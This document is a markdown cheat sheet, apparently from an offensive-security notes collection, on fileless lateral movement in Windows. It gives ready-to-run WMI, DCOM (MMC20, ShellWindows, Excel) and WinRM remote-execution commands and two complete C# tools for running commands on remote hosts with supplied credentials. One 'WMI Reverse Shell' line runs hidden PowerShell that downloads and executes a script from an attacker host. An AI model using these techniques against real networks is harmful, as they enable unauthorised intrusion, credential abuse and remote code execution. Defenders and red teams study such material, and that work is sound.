---
tags:
  - Foundational
  - Lateral_Movement
  - Windows
---

## Fileless Lateral Movement
resources: [MITRE - Lateral Movement](https://attack.mitre.org/tactics/TA0008/)

> [!tip] Execute code on remote systems without writing files to disk. Uses legitimate Windows protocols and COM objects.

### Common Protocols
> - **WMI** - Windows Management Instrumentation
> - **WinRM** - Windows Remote Management
> - **DCOM** - Distributed COM
> - **SMB** - Named pipes and admin shares
> - **RPC** - Remote Procedure Calls

### Authentication Methods
> - **Password** - Plaintext credentials
> - **NTLM Hash** - Pass-the-hash
> - **Kerberos Ticket** - Pass-the-ticket

## WMI Lateral Movement

### WMI Process Creation [Remote]
```cmd
wmic /node:<Target> /user:<Domain>\<User> /password:<Password> process call create "cmd.exe /c <Command>"
```

### PowerShell WMI Execution [Remote]
```powershell
$cred = New-Object System.Management.Automation.PSCredential("<Domain>\<User>", (ConvertTo-SecureString "<Password>" -AsPlainText -Force))
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c <Command>" -ComputerName <Target> -Credential $cred
```

### WMI Reverse Shell [Remote]
```cmd
wmic /node:<Target> /user:<User> /password:<Password> process call create "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/shell.ps1')"
```

## DCOM Lateral Movement

### MMC20.Application Method [Remote]
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "<Target>"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c <Command>", "7")
```

### ShellWindows Method [Remote]
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "<Target>"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c <Command>", "C:\Windows\System32", $null, 0)
```

### Excel.Application Method [Remote]
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "<Target>"))
$com.DisplayAlerts = $false
$com.DDEInitiate("cmd", "/c <Command>")
```

## Implementing Fileless Movement in C#

### WMI Process Creation
```csharp
using System;
using System.Management;

class WMIExec
{
    static void Main(string[] args)
    {
        string target = args[0];
        string command = args[1];
        string username = args[2];
        string password = args[3];

        ConnectionOptions options = new ConnectionOptions();
        options.Username = username;
        options.Password = password;

        ManagementScope scope = new ManagementScope("\\\\" + target + "\\root\\cimv2", options);
        scope.Connect();

        ManagementClass processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), null);
        ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
        inParams["CommandLine"] = command;

        ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);
        Console.WriteLine("ReturnValue: " + outParams["ReturnValue"]);
        Console.WriteLine("ProcessId: " + outParams["ProcessId"]);
    }
}
```

### WinRM Execution with C#
```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Security;

class WinRMExec
{
    static void Main(string[] args)
    {
        string target = args[0];
        string username = args[1];
        string password = args[2];
        string command = args[3];

        SecureString secPass = new SecureString();
        foreach (char c in password) secPass.AppendChar(c);
        PSCredential cred = new PSCredential(username, secPass);

        WSManConnectionInfo connInfo = new WSManConnectionInfo(
            new Uri("http://" + target + ":5985/wsman"),
            "http://schemas.microsoft.com/powershell/Microsoft.PowerShell",
            cred
        );

        using (Runspace rs = RunspaceFactory.CreateRunspace(connInfo))
        {
            rs.Open();
            using (PowerShell ps = PowerShell.Create())
            {
                ps.Runspace = rs;
                ps.AddScript(command);
                var results = ps.Invoke();
                foreach (var result in results)
                {
                    Console.WriteLine(result);
                }
            }
        }
    }
}
```
